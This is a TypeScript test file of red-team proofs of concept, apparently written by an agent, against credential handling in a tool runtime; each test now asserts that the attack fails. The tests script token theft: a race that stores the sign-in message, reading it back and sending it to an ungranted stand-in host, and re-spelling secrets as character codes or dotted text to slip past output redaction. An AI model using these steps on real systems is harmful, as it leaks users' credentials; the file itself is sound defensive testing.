// Red team round 2 on credential messages (docs/adapter-kinds.md#credential-messages): a fresh
// agent's proofs of concept, each now asserting that the attack fails.

import { SecretValue } from '@valet/core'
import { describe, expect, it } from 'vitest'
import { drain, grant, scriptedHub, setupHub, TOKEN } from './http-credential-message.fixtures'

const URL_HUB = 'https://hub.example.test/api/websocket'

/** A hub with a "store the next message as a note" command and a "read_note" command. */
function notingHub() {
  let storeNext = false
  let note = ''
  const base = scriptedHub()
  const http = {
    ...base.http,
    websocket: async (...args: Parameters<typeof base.http.websocket>) => {
      const inner = await base.http.websocket(...args)
      const extra: Buffer[] = []
      return {
        ...inner,
        send: async (data: Buffer, binary: boolean) => {
          const text = data.toString()
          if (storeNext) {
            note = text
            storeNext = false
          }
          if (text === '{"type":"store_next_message_as_note"}') storeNext = true
          if (text === 'read_note') extra.push(Buffer.from(JSON.stringify({ note })))
          // Let the inner hub track auth; ignore its JSON errors for non-JSON commands.
          try {
            await inner.send(data, binary)
          } catch {}
        },
        receive: async (wait: number) => {
          const e = extra.shift()
          return e !== undefined ? { kind: 'message' as const, data: e, binary: false } : inner.receive(wait)
        },
      }
    },
  }
  return { http, sent: base.sent, note: () => note }
}

describe('RT-1 (high, fixed): a race made sendCredential not first, or twice', () => {
  it('a send() issued alongside sendCredential is refused, and never reaches the server first', async () => {
    const hub = notingHub()
    const { run } = setupHub({ http: hub.http })
    const result = await run(async (ctx) => {
      const socket = await ctx.http!.websocket(URL_HUB)
      await drain(socket)
      await Promise.allSettled([
        socket.sendCredential('hub'),
        socket.send('{"type":"store_next_message_as_note"}'),
      ])
      return 'ok'
    })
    expect(result).toMatchObject({ status: 'failed', errorClass: 'undeclared-request' })
    expect(hub.sent).toEqual([JSON.stringify({ type: 'auth', access_token: TOKEN })])
    expect(hub.note()).toBe('')
  })

  it('two concurrent sendCredential calls send the credential once', async () => {
    const hub = scriptedHub()
    const { run } = setupHub({ http: hub.http })
    const result = await run(async (ctx) => {
      const socket = await ctx.http!.websocket(URL_HUB)
      await Promise.allSettled([socket.sendCredential('hub'), socket.sendCredential('hub')])
      return 'ok'
    })
    expect(result).toMatchObject({ status: 'failed', errorClass: 'undeclared-request' })
    expect(hub.sent.filter((m) => m.includes(TOKEN))).toHaveLength(1)
  })

  it('the full chain (stored by the race, read back in a later call, sent elsewhere) fails', async () => {
    const hub = notingHub()
    const { run } = setupHub({ http: hub.http })
    // Call 1: get the sign-in stored as a note.
    await run(async (ctx) => {
      const socket = await ctx.http!.websocket(URL_HUB)
      await drain(socket)
      await Promise.allSettled([
        socket.sendCredential('hub'),
        socket.send('{"type":"store_next_message_as_note"}'),
      ])
    })
    // Call 2: never touches the credential, so nothing in it redacts the token.
    const result = await run(async (ctx) => {
      const socket = await ctx.http!.websocket(URL_HUB)
      await drain(socket)
      await socket.send('read_note')
      const got = await drain(socket)
      const note = JSON.parse(got[0] as string).note as string
      const leaked = note === '' ? '' : (JSON.parse(note) as { access_token: string }).access_token
      // Off to a host the credential was never granted for.
      const other = await ctx.http!.websocket('https://other.example.test/api/websocket')
      await other.send(leaked).catch(() => undefined)
      return leaked
    })
    expect(JSON.stringify(result)).not.toContain(TOKEN)
    expect(hub.sent.filter((m) => m === TOKEN)).toEqual([])
  })
})

describe('RT-2 (medium, fixed): a short value could not be redacted from receive()', () => {
  it('a value under 12 characters is never sent in a message', async () => {
    const SHORT = 'pa55wd7'
    const hub = scriptedHub((_t, h) => h.push(`debug: you said ${h.received[0]}`), SHORT)
    const { run } = setupHub({
      http: hub.http,
      grants: { findGrant: async () => grant(), resolve: async () => SecretValue.fromString(SHORT) },
    })
    const result = await run(async (ctx) => {
      const socket = await ctx.http!.websocket(URL_HUB)
      await drain(socket)
      await socket.sendCredential('hub')
      await drain(socket)
      await socket.send('{"type":"x"}')
      const got = await drain(socket)
      // Tool code sees it; it spells it out so the call's output redaction misses it.
      const m = /"access_token":"([^"]+)"/.exec(got.join(''))
      const seen = m?.[1] ?? ''
      return { plaintextInToolCode: seen === SHORT, codes: [...seen].map((c) => c.charCodeAt(0)) }
    })
    expect(result).toMatchObject({ status: 'failed', errorClass: 'not-granted' })
    expect(hub.sent).toEqual([])
  })
})

describe('RT-3 (medium, fixed): an echo escaping / as \\/ (PHP json_encode)', () => {
  it('is refused, though a / every 11 characters splits every piece', async () => {
    const SLASHY = 'ab/cdefghij/klmnopqrs/tuvwxyz012/34'
    const hub = scriptedHub(
      (_t, h) => h.push(JSON.stringify({ echo: h.received[0] }).replaceAll('/', '\\/')),
      SLASHY,
    )
    const { run } = setupHub({
      http: hub.http,
      grants: { findGrant: async () => grant(), resolve: async () => SecretValue.fromString(SLASHY) },
    })
    const result = await run(async (ctx) => {
      const socket = await ctx.http!.websocket(URL_HUB)
      await drain(socket)
      await socket.sendCredential('hub')
      await drain(socket)
      await socket.send('{"type":"x"}')
      let got: string[] = []
      let refused = false
      try {
        got = await drain(socket)
      } catch {
        refused = true
      }
      const echoed = got.join('')
      // Undo the escaping, then re-spell so output redaction misses it.
      const m = /access_token\\{0,3}":\\{0,3}"([^"\\]*(?:\\+\/[^"\\]*)*)/.exec(echoed)
      const token = (m?.[1] ?? '').replace(/\\+\//g, '/')
      return { refused, spelled: [...token].join('.') }
    })
    expect(result).toMatchObject({ status: 'ok', output: { refused: true, spelled: '' } })
  })
})

describe('RT-4 (low, fixed): the declared, non-secret text of the message was redacted', () => {
  it('ordinary output holding the message’s own text is left alone', async () => {
    const { run } = setupHub()
    const result = await run(async (ctx) => {
      const socket = await ctx.http!.websocket(URL_HUB)
      await drain(socket)
      await socket.sendCredential('hub')
      return 'docs: send {"type":"auth","access_token":"..."} first'
    })
    expect(JSON.stringify(result)).not.toContain('[redacted]')
    expect(result).toMatchObject({ status: 'ok' })
  })
})

describe('held', () => {
  for (const name of ['__proto__', 'constructor', 'toString', 'rest'])
    it(`sendCredential(${name}) is refused and sends nothing`, async () => {
      const hub = scriptedHub()
      const { run } = setupHub({ http: hub.http })
      const result = await run(async (ctx) => {
        const socket = await ctx.http!.websocket(URL_HUB)
        await socket.sendCredential(name)
      })
      expect(result).toMatchObject({ status: 'failed' })
      expect(hub.sent).toEqual([])
    })
})
